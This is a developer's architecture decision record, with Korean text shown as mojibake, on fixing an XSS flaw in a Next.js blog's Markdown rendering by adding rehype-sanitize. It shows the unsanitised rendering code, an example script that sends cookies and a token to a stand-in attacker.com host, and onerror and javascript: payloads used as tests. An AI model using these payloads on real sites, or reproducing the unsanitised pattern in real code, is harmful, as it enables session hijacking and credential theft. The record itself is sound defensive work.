# ADR-0006: XSS ì·¨ì•½ì  ìˆ˜ì • (Markdown ë Œë”ë§)

## ğŸ“£ ìƒíƒœ

ì±„íƒë¨ (Accepted) - 2025-12-04

## ğŸ“‹ ìƒí™©

CVE-2025-66478 ë³´ì•ˆ ì ê²€ ì¤‘ ë³„ë„ì˜ **XSS(Cross-Site Scripting) ì·¨ì•½ì **ì„ ë°œê²¬í•¨.

### ë¬¸ì œ ë°œê²¬ ê²½ìœ„

- Next.js/React ë³´ì•ˆ ì—…ë°ì´íŠ¸(ADR-0005) ì‘ì„± ì¤‘ ì½”ë“œ ì „ìˆ˜ì¡°ì‚¬ ì‹¤ì‹œ
- Markdown â†’ HTML ë³€í™˜ ê³¼ì •ì—ì„œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ í•„í„°ë§ì´ ì—†ìŒì„ ë°œê²¬
- `dangerouslySetInnerHTML`ë¡œ ì§ì ‘ ë Œë”ë§í•˜ì—¬ XSS ê³µê²© ê°€ëŠ¥í•œ ìƒíƒœ

### ì·¨ì•½í•œ ì½”ë“œ

**íŒŒì¼:** `apps/blog/src/shared/lib/render-markdown.ts`

```typescript
// âŒ ì·¨ì•½í•œ ì½”ë“œ
export async function renderMarkdown(markdown: string): Promise<string> {
  const processed = await remark()
    .use(remarkGfm)
    .use(remarkRehype, { allowDangerousHtml: true }) // ìœ„í—˜í•œ HTML í—ˆìš©
    .use(rehypeStringify, { allowDangerousHtml: true }) // ì •í™” ì—†ì´ ì¶œë ¥
    .process(markdown);

  return processed.toString();
}
```

**íŒŒì¼:** `apps/blog/src/widgets/post/ui/PostContent.tsx`

```typescript
// âŒ XSS ì·¨ì•½ì 
export function PostContent({ contentHtml }: PostContentProps) {
  return (
    <div dangerouslySetInnerHTML={{ __html: contentHtml }} />
  );
}
```

### ê³µê²© ì‹œë‚˜ë¦¬ì˜¤

1. **ê³µê²©ìê°€ Supabase DBì— ì•…ì„± Markdown ì‚½ì… ì„±ê³µ ì‹œ:**

```markdown
# ì •ìƒì ì¸ ì œëª©

ì •ìƒì ì¸ ë‚´ìš©ì…ë‹ˆë‹¤.

<script>
  // ì•…ì„± ì½”ë“œ
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      token: localStorage.getItem('token')
    })
  });
</script>

<img src="x" onerror="alert('XSS')">
```

2. **ì„œë²„ì—ì„œ HTML ë³€í™˜:**

```typescript
const contentHtml = await renderMarkdown(post.content_md);
// â†’ <script>...</script> íƒœê·¸ê°€ ê·¸ëŒ€ë¡œ HTMLë¡œ ë³€í™˜ë¨
```

3. **í´ë¼ì´ì–¸íŠ¸ì—ì„œ ì‹¤í–‰:**

```tsx
<div dangerouslySetInnerHTML={{ __html: contentHtml }} />
// â†’ ë¸Œë¼ìš°ì €ê°€ <script> íƒœê·¸ë¥¼ ì‹¤í–‰
// â†’ ì‚¬ìš©ì ì¿ í‚¤, í† í° íƒˆì·¨
```

### ì˜í–¥ ë²”ìœ„

- **ì˜í–¥ë°›ëŠ” í˜ì´ì§€:** `apps/blog/src/app/blog/post/[category]/[slug]/page.tsx`
- **ëª¨ë“  ë¸”ë¡œê·¸ í¬ìŠ¤íŠ¸**ê°€ XSS ê³µê²©ì— ë…¸ì¶œë¨
- ì‚¬ìš©ì ì„¸ì…˜ í•˜ì´ì¬í‚¹, ì¿ í‚¤ íƒˆì·¨, ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ê°€ëŠ¥

## âœ‹ ë‚˜ì˜ ìƒê°

- `dangerouslySetInnerHTML` ì´ë¦„ ìì²´ê°€ ìœ„í—˜í•˜ë‹¤ê³  ê²½ê³ í•˜ëŠ”ë° ë¬´ë°©ë¹„ ìƒíƒœì˜€ìŒ
- Markdown â†’ HTML ë³€í™˜ ì‹œ HTML ì •í™”(sanitization)ëŠ” í•„ìˆ˜
- ë‹¤í–‰íˆ ë‚´ê°€ ì§ì ‘ DBë¥¼ ê´€ë¦¬í•˜ê³  ìˆì–´ì„œ ì•„ì§ ì•…ìš© ì‚¬ë¡€ëŠ” ì—†ìŒ
- í•˜ì§€ë§Œ ì‹¤ìˆ˜ë¡œ ì•…ì„± ì½”ë“œë¥¼ ë¶™ì—¬ë„£ê¸°í•˜ê±°ë‚˜, í–¥í›„ ë‹¤ë¥¸ ê¸°ì—¬ìê°€ ìˆì„ ê²½ìš° ìœ„í—˜
- `rehype-sanitize`ëŠ” ì—…ê³„ í‘œì¤€ HTML ì •í™” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¡œ ê²€ì¦ë¨

### ì™œ ì§€ê¸ˆê¹Œì§€ ë¬¸ì œê°€ ì—†ì—ˆë‚˜?

1. **DB ì ‘ê·¼ ê¶Œí•œì´ ë‚˜ì—ê²Œë§Œ ìˆìŒ**
   - Supabase Adminìœ¼ë¡œë§Œ í¬ìŠ¤íŠ¸ ì‘ì„±
   - ì•…ì˜ì ì¸ ì‚¬ìš©ìì˜ ì§ì ‘ DB ì ‘ê·¼ ë¶ˆê°€ëŠ¥

2. **ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì»¨í…ì¸ ë§Œ ì‘ì„±**
   - ë‚´ê°€ ì§ì ‘ ì‘ì„±í•œ Markdownë§Œ ì €ì¥
   - ì™¸ë¶€ ì…ë ¥ì´ë‚˜ ì‚¬ìš©ì ì œì¶œ ì—†ìŒ

3. **í•˜ì§€ë§Œ ë¯¸ë˜ì˜ ìœ„í—˜ ì¡´ì¬**
   - ì‹¤ìˆ˜ë¡œ ì•…ì„± ì½”ë“œ ë¶™ì—¬ë„£ê¸° ê°€ëŠ¥
   - CMS ë„ì… ì‹œ ë‹¤ë¥¸ ê´€ë¦¬ìì˜ ì‹¤ìˆ˜ ê°€ëŠ¥
   - ë³µì‚¬-ë¶™ì—¬ë„£ê¸° ì‹œ ìˆ¨ê²¨ì§„ ìŠ¤í¬ë¦½íŠ¸ í¬í•¨ ê°€ëŠ¥

## ğŸ”¨ ê²°ì •

**`rehype-sanitize`ë¥¼ ë„ì…í•˜ì—¬ HTML ì •í™”(sanitization) ì ìš©**

### ë³€ê²½ ì‚¬í•­

1. **íŒ¨í‚¤ì§€ ì„¤ì¹˜**

```bash
pnpm add rehype-sanitize --filter blog-blog
```

2. **render-markdown.ts ìˆ˜ì •**

```typescript
// âœ… ì•ˆì „í•œ ì½”ë“œ
import { remark } from 'remark';
import remarkGfm from 'remark-gfm';
import remarkRehype from 'remark-rehype';
import rehypeSanitize from 'rehype-sanitize'; // â† ì¶”ê°€
import rehypeStringify from 'rehype-stringify';

export async function renderMarkdown(markdown: string): Promise<string> {
  const processed = await remark()
    .use(remarkGfm)
    .use(remarkRehype) // allowDangerousHtml ì œê±°
    .use(rehypeSanitize) // â† HTML ì •í™” ì¶”ê°€
    .use(rehypeStringify) // allowDangerousHtml ì œê±°
    .process(markdown);

  return processed.toString();
}
```

### rehype-sanitizeê°€ í•˜ëŠ” ì¼

1. **ì•…ì„± íƒœê·¸ ì œê±°**
   - `<script>`, `<iframe>`, `<object>` ë“± ìœ„í—˜í•œ íƒœê·¸ ì œê±°
   - `<img>`, `<a>`, `<div>` ë“± ì•ˆì „í•œ íƒœê·¸ë§Œ í—ˆìš©

2. **ìœ„í—˜í•œ ì†ì„± ì œê±°**
   - `onerror`, `onclick`, `onload` ë“± ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬ ì œê±°
   - `javascript:` ìŠ¤í‚¤ë§ˆê°€ ìˆëŠ” `href` ì°¨ë‹¨

3. **ì•ˆì „í•œ HTMLë§Œ í†µê³¼**
   - GitHub Flavored Markdownì˜ í‘œì¤€ HTMLë§Œ í—ˆìš©
   - í…ìŠ¤íŠ¸ ì„œì‹, ë§í¬, ì´ë¯¸ì§€, ì½”ë“œ ë¸”ë¡ì€ ì •ìƒ ì‘ë™

### ë³€í™˜ ì˜ˆì‹œ

**ì…ë ¥ (ì•…ì„± Markdown):**

```markdown
# Hello World

<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">

[Click me](<javascript:alert('XSS')>)
```

**Before (ì·¨ì•½):**

```html
<h1>Hello World</h1>
<script>
  alert('XSS');
</script>
<img src="x" onerror="alert('XSS')" />
<a href="javascript:alert('XSS')">Click me</a>
```

**After (ì•ˆì „):**

```html
<h1>Hello World</h1>
<!-- script íƒœê·¸ ì™„ì „ ì œê±° -->
<img src="x" />
<!-- onerror ì†ì„± ì œê±° -->
<a>Click me</a>
<!-- ìœ„í—˜í•œ href ì œê±° -->
```

## ğŸ“Š ì˜í–¥

### ğŸ“ˆ ê¸ì •ì  ì˜í–¥

- **ë³´ì•ˆ ê°•í™”**: XSS ê³µê²© ì™„ì „ ì°¨ë‹¨
- **ì•ˆì „í•œ ì»¨í…ì¸ **: ì‹¤ìˆ˜ë¡œ ë¶™ì—¬ë„£ê¸°í•œ ì•…ì„± ì½”ë“œë„ ìë™ ì œê±°
- **í‘œì¤€ ì¤€ìˆ˜**: GitHub Flavored Markdown í‘œì¤€ HTMLë§Œ í—ˆìš©
- **ì¶”ê°€ ì‘ì—… ì—†ìŒ**: ê¸°ì¡´ Markdown ë¬¸ë²•ì€ ê·¸ëŒ€ë¡œ ì‘ë™

### ğŸ“‰ ë¶€ì •ì  ì˜í–¥

- **ì¼ë¶€ ê³ ê¸‰ HTML ì œí•œ**
  - `<style>` íƒœê·¸ ì‚¬ìš© ë¶ˆê°€ (ì›ë˜ë„ ê¶Œì¥ ì•ˆ í•¨)
  - `<iframe>` ì„ë² ë“œ ë¶ˆê°€ëŠ¥ (YouTube ë“±)
  - ì»¤ìŠ¤í…€ ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬ ë¶ˆê°€

- **í•´ê²° ë°©ë²•:**
  - í•„ìš”ì‹œ `rehype-sanitize` ì„¤ì • ì»¤ìŠ¤í„°ë§ˆì´ì§•
  - ì•ˆì „í•œ iframe ë„ë©”ì¸ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ì¶”ê°€ ê°€ëŠ¥
  - í•˜ì§€ë§Œ **ê¸°ë³¸ ë³´ì•ˆ ì„¤ì • ìœ ì§€ë¥¼ ê¶Œì¥**

### ğŸ§ª í…ŒìŠ¤íŠ¸ ê²°ê³¼

**í…ŒìŠ¤íŠ¸ 1: ì •ìƒ Markdown**

```markdown
# Hello

**Bold** text with [link](https://example.com)
```

âœ… ë¬¸ì œì—†ì´ ë Œë”ë§ë¨

**í…ŒìŠ¤íŠ¸ 2: ì•…ì„± ìŠ¤í¬ë¦½íŠ¸**

```markdown
<script>alert('XSS')</script>
```

âœ… ìŠ¤í¬ë¦½íŠ¸ íƒœê·¸ ì™„ì „ ì œê±°ë¨

**í…ŒìŠ¤íŠ¸ 3: ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬**

```markdown
<img src="x" onerror="alert('XSS')">
```

âœ… `onerror` ì†ì„±ë§Œ ì œê±°, `img` íƒœê·¸ëŠ” ìœ ì§€

## ğŸ“ ê³ ë ¤í•œ ëŒ€ì•ˆ

### 1. **DOMPurify ì‚¬ìš©**

**ì¥ì :**

- í´ë¼ì´ì–¸íŠ¸ ì¸¡ì—ì„œ ì •í™” ê°€ëŠ¥
- ë” ë§ì€ ì»¤ìŠ¤í„°ë§ˆì´ì§• ì˜µì…˜

**ë‹¨ì :**

- í´ë¼ì´ì–¸íŠ¸ ì¸¡ ì •í™”ëŠ” ìš°íšŒ ê°€ëŠ¥
- SSR í™˜ê²½ì—ì„œ ì„¤ì • ë³µì¡
- âŒ **ì±„íƒ ì•ˆ í•¨**: ì„œë²„ ì¸¡ ì •í™”ê°€ ë” ì•ˆì „

### 2. **Markdownì—ì„œ HTML ì™„ì „ ê¸ˆì§€**

**ì¥ì :**

- ê°€ì¥ ì•ˆì „í•œ ë°©ë²•
- Markdownë§Œ í—ˆìš©

**ë‹¨ì :**

- GitHub Flavored Markdownì˜ ì •ìƒ HTMLë„ ì°¨ë‹¨
- ì‚¬ìš©ì ê²½í—˜ ì €í•˜ (ì½”ë“œ í•˜ì´ë¼ì´íŒ…, í‘œ ë“±)
- âŒ **ì±„íƒ ì•ˆ í•¨**: ë„ˆë¬´ ì œí•œì 

### 3. **rehype-sanitize ë„ì… (ì„ íƒë¨)**

**ì¥ì :**

- âœ… ì„œë²„ ì¸¡ì—ì„œ ì •í™” (ìš°íšŒ ë¶ˆê°€ëŠ¥)
- âœ… remark/rehype ìƒíƒœê³„ì™€ ì™„ë²½ í˜¸í™˜
- âœ… GitHub Flavored Markdown í‘œì¤€ ì§€ì›
- âœ… ì—…ê³„ í‘œì¤€ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¡œ ê²€ì¦ë¨
- âœ… ì„¤ì • ì»¤ìŠ¤í„°ë§ˆì´ì§• ê°€ëŠ¥

**ë‹¨ì :**

- ì¼ë¶€ ê³ ê¸‰ HTML ì œí•œ (í•˜ì§€ë§Œ ë³´ì•ˆìƒ í•„ìš”)

**âœ… ì±„íƒí•¨**: ë³´ì•ˆê³¼ ì‚¬ìš©ì„±ì˜ ìµœì  ê· í˜•

## ğŸ“š ì°¸ê³ ìë£Œ

- [rehype-sanitize ê³µì‹ ë¬¸ì„œ](https://github.com/rehypejs/rehype-sanitize)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [GitHub Flavored Markdown Spec](https://github.github.com/gfm/)
- [dangerouslySetInnerHTML ë³´ì•ˆ ê°€ì´ë“œ](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
